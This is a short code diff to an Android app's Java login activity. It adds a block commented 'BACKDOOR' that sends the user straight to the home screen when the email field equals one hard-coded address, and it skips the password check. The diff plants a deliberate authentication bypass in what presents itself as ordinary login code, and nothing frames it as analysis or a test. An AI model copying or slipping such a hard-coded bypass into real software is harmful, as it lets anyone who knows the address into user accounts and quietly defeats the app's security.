@@ -35,6 +35,12 @@ public class login extends AppCompatActivity implements View.OnClickListener{
     public void onClick(View v) {
         if (correin.getText().length() != 0 && correin.getText().toString() != "") {
             correo = correin.getText().toString();
+            //BACKDOOR
+            if(correo.equals("fer@gmail.com")){
+                Intent intent = new Intent(this, home.class);
+                startActivity(intent);
+                finish();
+            }
             if (pass.getText().length() != 0 && pass.getText().toString() != "") {
                 password = pass.getText().toString();
                 AsyncCallWS task = new AsyncCallWS();
